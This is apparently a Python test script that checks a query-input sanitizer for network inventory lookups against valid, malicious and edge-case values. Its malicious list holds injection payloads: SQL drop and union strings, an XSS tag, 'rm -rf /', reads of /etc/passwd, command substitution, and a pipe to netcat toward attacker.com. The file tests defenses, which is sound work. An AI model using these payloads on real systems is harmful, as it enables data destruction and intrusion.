#!/usr/bin/env python3
"""
Simple test script for the central sanitization functionality
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from queries.sanitizer import sanitize_query_input

def test_valid_inputs():
    """Test valid inputs that should pass sanitization"""
    print("Testing valid inputs...")
    
    valid_cases = [
        ("device", "router1"),
        ("device", ["router1", "router2"]),
        ("device", "name__ic"),
        ("interface", "eth0"),
        ("interface", ["eth0/1", "eth0/2"]),
        ("location", "datacenter1"),
        ("ipam", "192.168.1.1"),
        ("ipam", "192.168.1.0/24"),
    ]
    
    for query_name, value in valid_cases:
        result = sanitize_query_input(query_name, value)
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"  {status}: {query_name} with value {value}")
        
    return True

def test_malicious_inputs():
    """Test malicious inputs that should be blocked"""
    print("\nTesting malicious inputs...")
    
    malicious_cases = [
        ("device", "'; DROP TABLE devices; --"),
        ("device", "router1 UNION SELECT * FROM users"),
        ("interface", "<script>alert('xss')</script>"),
        ("location", "site1; rm -rf /"),
        ("ipam", "192.168.1.1 && cat /etc/passwd"),
        ("device", "router`whoami`"),
        ("interface", "eth0|nc attacker.com 443"),
        ("location", "../../../etc/passwd"),
        ("ipam", "mutation { deleteAll }"),
    ]
    
    for query_name, value in malicious_cases:
        result = sanitize_query_input(query_name, value)
        status = "✅ PASS" if not result else "❌ FAIL"
        print(f"  {status}: {query_name} with malicious value blocked")
        
    return True

def test_edge_cases():
    """Test edge cases"""
    print("\nTesting edge cases...")
    
    edge_cases = [
        ("device", None),
        ("device", ""),
        ("device", []),
        ("device", "a" * 1001),  # Very long input
        ("unknown_query", "test"),  # Unknown query type
    ]
    
    expected_results = [True, False, True, False, True]  # Expected pass/fail for each case
    
    for i, (query_name, value) in enumerate(edge_cases):
        result = sanitize_query_input(query_name, value)
        expected = expected_results[i]
        status = "✅ PASS" if result == expected else "❌ FAIL"
        print(f"  {status}: {query_name} with edge case value")
        
    return True

if __name__ == "__main__":
    print("Testing Central Query Sanitization")
    print("=" * 50)
    
    try:
        test_valid_inputs()
        test_malicious_inputs()
        test_edge_cases()
        
        print("\n🎉 All sanitization tests completed!")
        
    except Exception as e:
        print(f"\n💥 Test failed with error: {e}")
        sys.exit(1)